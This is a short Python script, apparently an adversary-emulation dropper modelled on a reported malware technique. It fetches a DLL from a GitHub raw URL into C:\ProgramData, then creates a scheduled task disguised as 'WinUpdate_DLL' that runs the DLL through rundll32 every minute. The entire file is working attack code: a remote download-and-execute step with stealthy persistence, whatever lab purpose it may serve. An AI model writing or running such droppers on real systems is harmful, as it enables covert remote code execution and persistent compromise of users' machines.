import os
import subprocess
import urllib.request

# CONFIGURATION - Raw strings 'r' fix the \r and \W escape errors
dll_url = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/V1/TEST_Dll1.dll"
dll_path = r"C:\ProgramData\TEST_Dll1.dll"
log_path = r"C:\ProgramData\stage1.log"
rundll_bin = r"C:\Windows\System32\rundll32.exe"
# This is the command the Scheduled Task will run
rundll_cmd = f'{rundll_bin} {dll_path},DebugHello'

# PHASE 1: Reliable Binary Download
try:
    urllib.request.urlretrieve(dll_url, dll_path)
    with open(log_path, 'a') as f:
        f.write(f"DLL ingressed to {dll_path}\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"Download Error: {e}\n")

# PHASE 2: Persistence (The ReliaQuest 'pypi-py' style task)
# We skip immediate execution and let the task handle it.
# The task is set to run every 1 minutes.
task_cmd = f'schtasks /create /f /tn "WinUpdate_DLL" /tr "{rundll_cmd}" /sc minute /mo 1'

try:
    subprocess.run(task_cmd, shell=True, check=True)
    with open(log_path, 'a') as f:
        f.write("Persistence established. Task 'WinUpdate_DLL' created.\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"Task Creation Error: {e}\n")
